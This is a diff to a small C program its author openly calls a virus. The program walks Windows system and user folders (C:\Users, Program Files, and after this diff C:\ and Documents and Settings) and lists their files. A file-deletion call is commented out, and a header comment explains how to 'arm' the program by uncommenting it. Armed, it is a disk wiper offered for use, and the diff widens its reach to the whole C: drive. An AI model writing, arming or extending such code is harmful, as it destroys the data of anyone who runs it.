@@ -1,5 +1,7 @@
 /* by Creator_LuXury */
 /* PLEASE BE CAREFUL WHEN USING THIS IF YOU WANT TO ARM VIRUS REMOVE "//" FORM REMOVE LINe 23 and 71 */ 
+/* TESTED ON WINDOWS XP */
+
 # include <stdio.h>
 # include <windows.h>
 # include <dirent.h>
@@ -20,7 +22,7 @@ int rem(char s[50]){  // this function creates list of files and directories and
 		    if (ff != NULL){
 		    	printf("%s\n", entry->d_name);
 				fclose(ff);	
- //  				remove(srcat(fullname,entry->d_name));
+ //  				remove(fullname);
 			}
 			else if (ff == NULL) {
         	printf("%s(directory)\n",entry->d_name);
@@ -43,7 +45,7 @@ int rem(char s[50]){  // this function creates list of files and directories and
 }
 int main (){
 	int x = 1;
-	int t = 6;
+	int t = 8;
 	while (t--){  // this loop allows to find specific locations
 	if(x==1) {
 	char a[50] = "C:\\Users";
@@ -63,6 +65,14 @@ int main (){
 	}
 	else if (x==5){
 	char a[50] = "C:\\Program Files (x86)";
+	rem(a);
+	}
+	else if (x==6){
+	char a[50] = "C:\\";
+	rem(a);
+	}
+	else if (x==7){
+	char a[50] = "C:\\Documents and Settings";
 	rem(a);
 	}
 //	rem(a);
